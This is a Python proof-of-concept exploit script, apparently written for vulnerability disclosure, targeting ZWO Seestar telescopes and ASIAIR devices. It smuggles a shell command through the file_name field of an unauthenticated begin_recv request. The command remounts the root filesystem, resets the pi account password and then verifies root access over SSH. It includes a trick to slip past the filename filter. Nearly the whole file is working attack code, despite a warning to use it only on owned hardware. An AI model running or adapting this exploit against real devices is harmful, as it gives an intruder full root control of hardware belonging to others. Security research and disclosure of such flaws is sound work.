#!/usr/bin/env python3
"""
End-to-end PoC: from network-only access to interactive root shell.

Works on every ZWO product that ships the zwoair_updater daemon:

  * Seestar family (S30 / S30P / S50)                       — binary file port 4361
  * ASIAIR family  (Mini / Plus / Pro)                      — binary file port 4360
  * ASI cameras with built-in ASIAIR (ASI2600MC Air, etc.)  — binary file port 4360

The command port (4350) is the same on every variant. Auto-detection probes
the two candidate file ports; pass --device to force one. Use --device asiair
for an ASI camera that has the ASIAIR firmware integrated.

Uses the begin_recv command injection to:

  1. remount rootfs read-write,
  2. set the `pi` account password to a value the operator supplies,
  3. remount rootfs read-only,
  4. verify SSH access works.

`pi` has passwordless sudo on stock firmware, so password access on `pi`
== root on the device.

DO NOT RUN against any device you do not own. Use only on your own hardware
for the purpose of auditing the device's behavior.
"""
import argparse
import json
import socket
import sys
import time

try:
    import paramiko
except ImportError:
    sys.exit("[!] pip3 install paramiko")


# Per-device binary file port. Command port (4350) is the same on both.
DEVICE_FILE_PORT = {
    "asiair": 4360,
    "seestar": 4361,
}


def resolve_file_port(host, device):
    """Pick the file-channel port. 'auto' probes both."""
    if device != "auto":
        return DEVICE_FILE_PORT[device]
    for label, port in DEVICE_FILE_PORT.items():
        s = socket.socket()
        s.settimeout(2)
        try:
            s.connect((host, port))
            s.close()
            print(f"[*] auto-detect: file port {port} open → device looks like {label}")
            return port
        except OSError:
            continue
    return None


def fire(host, payload, file_port):
    file_name = f"x$({payload})y"
    if "/" in file_name:
        sys.exit("[!] payload contains literal '/' — filename filter will reject")
    if len(file_name) > 240:
        print(f"[!] warning: file_name length {len(file_name)} approaches the "
              "server's accept limit (~255)")

    s_bin = socket.socket(); s_bin.settimeout(5); s_bin.connect((host, file_port))
    s = socket.socket(); s.settimeout(5); s.connect((host, 4350))
    s.recv(4096)  # banner
    rpc = {"id": 1, "method": "begin_recv",
           "params": [{"file_len": 4, "file_name": file_name,
                       "run_update": False,
                       "md5": "00000000000000000000000000000000"}]}
    s.sendall((json.dumps(rpc) + "\r\n").encode())
    s.recv(4096)
    s_bin.sendall(b"AAAA")
    time.sleep(2)
    s.close(); s_bin.close()


def main():
    ap = argparse.ArgumentParser(
        description="Set the pi password on a ZWO Seestar or ASIAIR via the "
                    "unauthenticated zwoair_updater command injection.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n"
               "  %(prog)s 192.168.1.39   --device seestar\n"
               "  %(prog)s 192.168.1.121  --device asiair --password r0otIsLove\n"
               "  %(prog)s 192.168.1.121  --device auto\n",
    )
    ap.add_argument("host", help="device IP")
    ap.add_argument("--device", choices=("auto", "seestar", "asiair"), default="auto",
                    help="which product (default: auto-detect by probing 4360/4361)")
    ap.add_argument("--password", default="raspberry",
                    help="password to set on the pi account (default: raspberry)")
    args = ap.parse_args()

    file_port = resolve_file_port(args.host, args.device)
    if file_port is None:
        sys.exit(f"[!] neither 4360 nor 4361 open on {args.host}; "
                 "is the device powered on and on the LAN?")

    # R=$(echo $PATH|cut -c1) supplies '/' without using a literal '/' character
    # (the filename filter would reject it).
    payload = (
        "cd;"
        "R=$(echo $PATH|cut -c1);"
        "sudo mount -o remount,rw $R;"
        f"echo pi:{args.password}|sudo chpasswd;"
        "sync;"
        "sudo mount -o remount,ro $R"
    )

    print(f"[*] target: {args.host}  (cmd 4350, file {file_port})")
    print(f"[*] payload: x$({payload})y")
    print("[*] firing injection...")
    fire(args.host, payload, file_port)

    print("[*] verifying via SSH...")
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(args.host, username="pi", password=args.password,
                  timeout=10, allow_agent=False, look_for_keys=False)
    except paramiko.AuthenticationException:
        sys.exit("[!] SSH auth failed — exploit may not have fired (check ports)")

    _, out, _ = c.exec_command("id; uname -a; hostname; cat /etc/os-release | head -1",
                               timeout=10)
    print(out.read().decode())
    c.close()
    print(f"[+] root access established. SSH: ssh pi@{args.host} (password: {args.password})")


if __name__ == "__main__":
    main()
